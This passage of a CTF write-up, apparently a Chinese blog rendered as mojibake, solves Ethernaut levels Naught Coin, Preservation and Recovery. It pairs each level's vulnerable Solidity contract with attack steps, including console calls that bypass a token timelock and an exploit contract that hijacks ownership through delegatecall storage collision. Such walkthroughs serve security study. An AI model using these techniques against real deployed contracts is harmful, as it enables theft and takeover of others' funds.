src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220226142421115.png" alt="image-20220226142421115"></p><h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15. Naught Coin"></a>15. Naught Coin</h2><h3 id="é—¯å…³è¦æ±‚-2"><a href="#é—¯å…³è¦æ±‚-2" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>NaughtCoin æ˜¯ä¸€ç§ ERC20 ä»£å¸ï¼Œè€Œä¸”æ‚¨å·²ç»æŒæœ‰è¿™äº›ä»£å¸ã€‚é—®é¢˜æ˜¯æ‚¨åªèƒ½åœ¨ 10 å¹´ä¹‹åæ‰èƒ½è½¬ç§»å®ƒä»¬ã€‚æ‚¨èƒ½å°è¯•å°†å®ƒä»¬è½¬ç§»åˆ°å¦ä¸€ä¸ªåœ°å€ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥è‡ªç”±ä½¿ç”¨å®ƒä»¬å—ï¼Ÿé€šè¿‡å°†æ‚¨çš„ä»£å¸ä½™é¢å˜ä¸º 0 æ¥å®Œæˆæ­¤å…³å¡ã€‚</p><h3 id="åˆçº¦ä»£ç -2"><a href="#åˆçº¦ä»£ç -2" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;;<br><br> contract NaughtCoin is ERC20 &#123;<br><br>  // string public constant name = &#x27;NaughtCoin&#x27;;<br>  // string public constant symbol = &#x27;0x0&#x27;;<br>  // uint public constant decimals = 18;<br>  uint public timeLock = now + 10 * 365 days;<br>  uint256 public INITIAL_SUPPLY;<br>  address public player;<br><br>  constructor(address _player) <br>  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)<br>  public &#123;<br>    player = _player;<br>    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));<br>    // _totalSupply = INITIAL_SUPPLY;<br>    // _balances[player] = INITIAL_SUPPLY;<br>    _mint(player, INITIAL_SUPPLY);<br>    emit Transfer(address(0), player, INITIAL_SUPPLY);<br>  &#125;<br>  <br>  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;<br>    super.transfer(_to, _value);<br>  &#125;<br><br>  // Prevent the initial owner from transferring tokens until the timelock has passed<br>  modifier lockTokens() &#123;<br>    if (msg.sender == player) &#123;<br>      require(now &gt; timeLock);<br>      _;<br>    &#125; else &#123;<br>     _;<br>    &#125;<br>  &#125; <br>&#125; <br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-2"><a href="#åˆçº¦åˆ†æ-2" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><ul><li>æ ¹æ®é¢˜æ„ï¼Œéœ€è¦å°†è‡ªå·±çš„ <code>balance</code> æ¸…ç©ºã€‚åˆçº¦æä¾›äº† <code>transfer()</code> è¿›è¡Œè½¬è´¦ï¼Œä½†æœ‰ä¸€ä¸ª <code>modifier lockTokens()</code> é™åˆ¶ï¼Œåªæœ‰ <code>10</code> å¹´åæ‰èƒ½è°ƒç”¨ <code>transfer()</code></li><li>æ³¨æ„è¯¥åˆçº¦æ˜¯ <code>ERC20</code> çš„å­åˆçº¦ï¼Œé¢˜ç›®ä¸­ä¹Ÿç»™äº† <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">The ERC20 Spec</a> å’Œ <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts">The OpenZeppelin codebase</a></li><li>åœ¨å­åˆçº¦æ‰¾ä¸å‡ºæ›´å¤šä¿¡æ¯çš„æ—¶å€™ï¼ŒæŠŠç›®å…‰æ›´å¤šæ”¾åˆ°çˆ¶åˆçº¦ <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20.sol</a> å’Œæ¥å£ä¸Š</li><li>åœ¨ <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">The ERC20 Spec</a> ä¸­ï¼Œé™¤äº† <code>transfer()</code> ä¹‹å¤–ï¼Œè¿˜æœ‰ <code>transferFrom()</code> å‡½æ•°ä¹Ÿå¯ä»¥è¿›è¡Œè½¬è´¦</li><li>ç›´æ¥çœ‹çˆ¶åˆçº¦ <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20.sol</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> contract ERC20 is Context, IERC20, IERC20Metadata &#123;<br>...<br>    function transfer(address to, uint256 amount) public virtual override returns (bool) &#123;<br>        address owner = _msgSender();<br>        _transfer(owner, to, amount);<br>        return true;<br>    &#125;<br>    <br>    function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;<br>        return _allowances[owner][spender];<br>    &#125;<br><br>    function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;<br>        address owner = _msgSender();<br>        _approve(owner, spender, amount);<br>        return true;<br>    &#125;<br>    <br>    function transferFrom(<br>        address from,<br>        address to,<br>        uint256 amount<br>    ) public virtual override returns (bool) &#123;<br>        address spender = _msgSender();<br>        _spendAllowance(from, spender, amount);<br>        _transfer(from, to, amount);<br>        return true;<br>    &#125;<br>    ...<br>    <br>    function _transfer(<br>        address from,<br>        address to,<br>        uint256 amount<br>    ) internal virtual &#123;<br>        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);<br>        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);<br><br>        _beforeTokenTransfer(from, to, amount);<br><br>        uint256 fromBalance = _balances[from];<br>        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);<br>        unchecked &#123;<br>            _balances[from] = fromBalance - amount;<br>        &#125;<br>        _balances[to] += amount;<br><br>        emit Transfer(from, to, amount);<br><br>        _afterTokenTransfer(from, to, amount);<br>    &#125;<br>    <br>    function _approve(<br>        address owner,<br>        address spender,<br>        uint256 amount<br>    ) internal virtual &#123;<br>        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);<br>        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);<br><br>        _allowances[owner][spender] = amount;<br>        emit Approval(owner, spender, amount);<br>    &#125;<br>    <br>    function _spendAllowance(<br>        address owner,<br>        address spender,<br>        uint256 amount<br>    ) internal virtual &#123;<br>        uint256 currentAllowance = allowance(owner, spender);<br>        if (currentAllowance != type(uint256).max) &#123;<br>            require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);<br>            unchecked &#123;<br>                _approve(owner, spender, currentAllowance - amount);<br>            &#125;<br>        &#125;<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>çœ‹ <code>transferFrom</code> å‡½æ•°ï¼Œå…¶ä¸­è°ƒç”¨äº† <code>_spendAllowance</code> å‡½æ•°ï¼Œåœ¨ <code>_spendAllowance</code> å‡½æ•°ä¸­ï¼Œæœ‰è¿™æ ·å‡ è¡Œä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 currentAllowance = allowance(owner, spender);<br>      if (currentAllowance != type(uint256).max) &#123;<br>          require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);<br>          unchecked &#123;<br>              _approve(owner, spender, currentAllowance - amount);<br>          &#125;<br>      &#125;<br></code></pre></td></tr></table></figure><p>å°±ç›¸å½“äºtranferç›´æ¥æ˜¯æ‹¥æœ‰è€…è°ƒç”¨ï¼Œå°†ä»–çš„ä»£å¸è½¬ç»™åˆ«äººï¼Œè€ŒtransferFromæ˜¯ç”±è¢«è½¬è´¦çš„äººè°ƒç”¨ï¼Œè¿™ä¸ªallowance(owner, spender)å°±æ˜¯è®¸å¯çš„é‡‘é¢ï¼Œæ„æ€æ˜¯ownerè¿™ä¸ªè´¦å·å…è®¸è½¬ç»™spenderè¿™ä¸ªè´¦å·çš„ä»£å¸çš„æ•°é‡ï¼Œå¦‚æœè¿™ä¸ªä¸ç©ºçš„è¯ï¼Œspenderå°±å¯ä»¥è°ƒç”¨transferFromå‡½æ•°ä»owneré‚£é‡Œè·å¾—è½¬è´¦ã€‚</p></li><li><p>å¯ä»¥ç›´æ¥è°ƒç”¨è¿™ä¸ª <code>transferFrom</code> ï¼Œä½†æ˜¯ <code>transferFrom</code> éœ€è¦ <code>allowance(owner, spender)</code> ä¸ä¸ºç©ºï¼Œåœ¨ <code>_approve</code> å‡½æ•°ä¸­å¯ä»¥è®¾å®š <code>_allowances[owner][spender]</code> çš„å€¼ï¼Œè€Œ<code>_approve</code> å‡½æ•°æ˜¯è¢« <code>approve</code> å‡½æ•°è°ƒç”¨äº†ï¼Œç”±äºæˆ‘ä»¬å°±æ˜¯åˆçº¦çš„ <code>owner</code> ï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±è°ƒç”¨ <code>approve</code> ç»™è‡ªå·±æˆæƒ</p></li></ul><h3 id="æ”»å‡»æµç¨‹-2"><a href="#æ”»å‡»æµç¨‹-2" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><p>æŸ¥è¯¢ä½™é¢</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220310192324679.png" alt="image-20220310192324679"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">await</span> contract.allowance(player, <span class="hljs-string">&quot;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;</span>)).toString() <span class="hljs-string">&quot;1000000000000000000000000&quot;</span><br><br><span class="hljs-keyword">await</span> contract.approve(<span class="hljs-string">&quot;0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624&quot;</span>, (<span class="hljs-keyword">await</span> contract.balanceOf(player)).toString())<br><br><span class="hljs-keyword">await</span> contract.transferFrom(player, <span class="hljs-string">&#x27;0xcd69Bb01b11200a24F2792Abb643f38625e9FBd1&#x27;</span>, (<span class="hljs-keyword">await</span> contract.balanceOf(player)).toString())<br></code></pre></td></tr></table></figure><p>å†æ¬¡æŸ¥è¯¢ä½™é¢</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220310192448888.png" alt="image-20220310192448888"></p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220310192147705.png" alt="image-20220310192147705"></p><h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16. Preservation"></a>16. Preservation</h2><h3 id="é—¯å…³è¦æ±‚-3"><a href="#é—¯å…³è¦æ±‚-3" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>æ­¤åˆåŒä½¿ç”¨åº“å­˜å‚¨ä¸¤ä¸ªä¸åŒæ—¶åŒºçš„ä¸¤ä¸ªä¸åŒæ—¶é—´ï¼Œæ„é€ å‡½æ•°ä¸ºæ¯æ¬¡è¦å­˜å‚¨çš„åº“åˆ›å»ºä¸¤ä¸ªå®ä¾‹ã€‚ è€Œç©å®¶çš„ç›®æ ‡æ˜¯è·å–åˆçº¦çš„owneræƒé™ã€‚</p><h3 id="åˆçº¦ä»£ç -3"><a href="#åˆçº¦ä»£ç -3" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-3"><a href="#åˆçº¦åˆ†æ-3" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><ul><li><p><code>delegatecall</code> ä¸ <code>call</code> åŠŸèƒ½ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äº <code>delegatecall</code> ä»…ä½¿ç”¨ç»™å®šåœ°å€çš„ä»£ç ï¼Œå…¶å®ƒä¿¡æ¯åˆ™ä½¿ç”¨å½“å‰åˆçº¦(å¦‚å­˜å‚¨ï¼Œä½™é¢ç­‰ç­‰)ã€‚æ³¨æ„ <code>delegatecall</code> æ˜¯å±é™©å‡½æ•°ï¼Œå®ƒå¯ä»¥å®Œå…¨æ“ä½œå½“å‰åˆçº¦çš„çŠ¶æ€ï¼ˆå®ç°å˜é‡è¦†ç›–ï¼‰ï¼Œå¯ä»¥å‚è€ƒç¬¬7é¢˜ <code>Delegation</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract a&#123;<br>    uint public x1;<br>    uint public x2;<br><br>    function funca(address param)&#123;<br>        param.delegate(bytes4(keccak256(&quot;funcb()&quot;)));<br>    &#125;<br>&#125;<br>contract b&#123;<br>    uint public y1;<br>    uint public y2;<br><br>    function funcb()&#123;<br>        y1=1;<br>        y2=2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°åˆçº¦ä¸­ï¼Œä¸€æ—¦åœ¨ a ä¸­è°ƒç”¨äº† b çš„<code>funcb</code>å‡½æ•°ï¼Œé‚£ä¹ˆå¯¹åº” a ä¸­ x1 å°±ä¼šç­‰äºï¼Œx2 å°±ä¼šç­‰äº 2ã€‚</p><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å®é™… b åˆçº¦çš„<code>funcb</code>å‡½æ•°æ˜¯æŠŠ storage é‡Œé¢çš„<code>slot 1</code>çš„å€¼æ›´æ¢ä¸ºäº† 1ï¼ŒæŠŠ<code>slot 2</code>çš„å€¼æ›´æ¢ä¸ºäº† 2ï¼Œé‚£ä¹ˆç”±äº delegatecall çš„åŸå› è¿™é‡Œä¿®æ”¹çš„æ˜¯ a çš„ storageï¼Œå¯¹åº”å°±æ˜¯ä¿®æ”¹äº† x1ï¼Œx2ã€‚</p><p>æ³¨æ„ï¼Œå’Œslotæ‰€åœ¨çš„ä½ç½®æœ‰å…³ç³»ï¼Œå’Œå˜é‡åå­—æ²¡æœ‰å…³ç³»</p></li><li><p><code>delegateCall</code> æ–¹æ³•ä»…ä»…ä½¿ç”¨ç›®æ ‡åˆçº¦çš„ä»£ç ï¼Œ å…¶ä½™çš„ <code>storage</code> ç­‰æ•°æ®å‡ä½¿ç”¨è‡ªå·±çš„ï¼Œè¿™å°±ä½¿å¾—æŸäº›è®¿å­˜æ“ä½œä¼šé”™è¯¯çš„å¤„ç†å¯¹è±¡</p></li><li><p>æ‰€ä»¥è¿™ä¸ªé¢˜å¯ä»¥è¿™æ ·è§£å†³ï¼š</p><ul><li>æˆ‘ä»¬è°ƒç”¨ <code>Preservation</code> çš„ <code>setFirstTime</code> å‡½æ•°å®é™…é€šè¿‡ <code>delegatecall</code> æ‰§è¡Œäº† <code>LibraryContract</code> çš„ <code>setTime</code> å‡½æ•°ï¼Œä¿®æ”¹äº† <code>slot 0</code> ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹äº† <code>timeZone1Library</code> å˜é‡ï¼ˆåœ¨ <code>LibraryContract</code> åˆçº¦ä¸­æ‰€ä¿®æ”¹çš„ <code>storedTime</code> ä½äº <code>slot 0</code> ï¼‰</li><li>è¿™æ ·ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>setFirstTime</code> å°† <code>timeZone1Library</code> å˜é‡ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„åˆçº¦çš„åœ°å€ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨ <code>setFirstTime</code> å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬åˆçº¦çš„ä»»æ„ä»£ç äº†</li></ul></li></ul><h3 id="æ”»å‡»æµç¨‹-3"><a href="#æ”»å‡»æµç¨‹-3" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address public timeZone1Library;<br>    address public timeZone2Library;<br>    address public owner;<br><br>    address instance_add = 0xFCe5b78fC7F350b7a710e644E67A232856E097Fc;<br>    Preservation preservation = Preservation(instance_add);<br><br>    function attack1() public &#123;<br>        preservation.setFirstTime(uint(address(this)));<br>    &#125;<br><br>    function attack2() public &#123;<br>        preservation.setFirstTime(uint(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624)); //ç©å®¶åœ°å€<br>    &#125;<br><br>    function setTime(uint _time) public &#123;<br>        timeZone1Library = address(_time);<br>        timeZone2Library = address(_time);<br>        owner = address(_time);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220301222406436.png" alt="image-20220301222406436"></p><h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17. Recovery"></a>17. Recovery</h2><h3 id="é—¯å…³è¦æ±‚-4"><a href="#é—¯å…³è¦æ±‚-4" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>åˆçº¦çš„åˆ›å»ºè€…å·²ç»æ„å»ºäº†ä¸€ä¸ªéå¸¸ç®€å•çš„åˆçº¦ç¤ºä¾‹ã€‚ä»»ä½•äººéƒ½å¯ä»¥è½»æ¾åœ°åˆ›å»ºæ–°çš„ä»£å¸ã€‚éƒ¨ç½²ç¬¬ä¸€ä¸ªä»¤ç‰Œåˆçº¦åï¼Œåˆ›å»ºè€…å‘é€äº†0.5etherä»¥è·å–æ›´å¤štokenã€‚åæ¥ä»–ä»¬å¤±å»äº†åˆåŒåœ°å€ã€‚ å¦‚æœæ‚¨å¯ä»¥ä»ä¸¢å¤±çš„åˆåŒåœ°å€ä¸­æ¢å¤ï¼ˆæˆ–ç§»é™¤ï¼‰0.5etherï¼Œåˆ™æ­¤çº§åˆ«å°†å®Œæˆã€‚</p><h3 id="åˆçº¦ä»£ç -4"><a href="#åˆçº¦ä»£ç -4" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Recovery &#123;<br><br>  //generate tokens<br>  function generateToken(string memory _name, uint256 _initialSupply) public &#123;<br>    new SimpleToken(_name, msg.sender, _initialSupply);<br>  <br>  &#125;<br>&#125;<br><br>contract SimpleToken &#123;<br><br>  using SafeMath for uint256;<br>  // public variables<br>  string public name;<br>  mapping (address =&gt; uint) public balances;<br><br>  // constructor<br>  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;<br>    name = _name;<br>    balances[_creator] = _initialSupply;<br>  &#125;<br><br>  // collect ether in return for tokens<br>  receive() external payable &#123;<br>    balances[msg.sender] = msg.value.mul(10);<br>  &#125;<br><br>  // allow transfers of tokens<br>  function transfer(address _to, uint _amount) public &#123; <br>    require(balances[msg.sender] &gt;= _amount);<br>    balances[msg.sender] = balances[msg.sender].sub(_amount);<br>    balances[_to] = _amount;<br>  &#125;<br><br>  // clean up after ourselves<br>  function destroy(address payable _to) public &#123;<br>    selfdestruct(_to);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-4"><a href="#åˆçº¦åˆ†æ-4" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>åŒºå—é“¾ä¸Šæ‰€æœ‰ä¿¡æ¯éƒ½æ˜¯å…¬å¼€çš„ï¼Œå°†å®ä¾‹åœ°å€æ‹¿åˆ°<a href="https://rinkeby.etherscan.io/">åŒºå—é“¾æµè§ˆå™¨</a>ä¸Šå»æŸ¥è¯¢å³å¯æ‰¾å›åˆåŒåœ°å€ï¼Œå†åˆ©ç”¨ <code>selfdestruct</code> æ¢å¤0.5ether</p><h3 id="æ”»å‡»æµç¨‹-4"><a href="#æ”»å‡»æµç¨‹-4" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><p> å®ä¾‹åœ°å€ï¼š0x08F66239f112CA4CF479E7a73dEc1d11b6cB92D3</p><p><a href="https://rinkeby.etherscan.io/address/0x08F66239f112CA4CF479E7a73dEc1d11b6cB92D3#internaltx">https://rinkeby.etherscan.io/address/0x08F66239f112CA4CF479E7a73dEc1d11b6cB92D3#internaltx</a></p><p><img 